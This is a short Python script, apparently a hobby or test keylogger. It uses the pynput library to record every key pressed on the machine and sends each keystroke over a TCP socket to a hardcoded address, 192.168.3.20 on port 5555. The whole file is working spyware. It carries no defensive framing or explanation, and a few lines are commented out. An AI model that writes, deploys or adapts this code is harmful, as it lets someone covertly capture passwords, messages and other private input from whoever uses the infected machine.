from pynput.keyboard import Listener
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "192.168.3.20"
port = 5555
s.connect((host, port))
i = 0
a = 2
#encode('utf-8')
def write(key):
    #letter1  = "kiba"
    letter = str(key)
    letter =  " " + letter + "\n"
    #letter = letter.replace("u", "")
    s.send(letter.encode('utf-8'))
with Listener(on_press=write) as l:
     l.join()
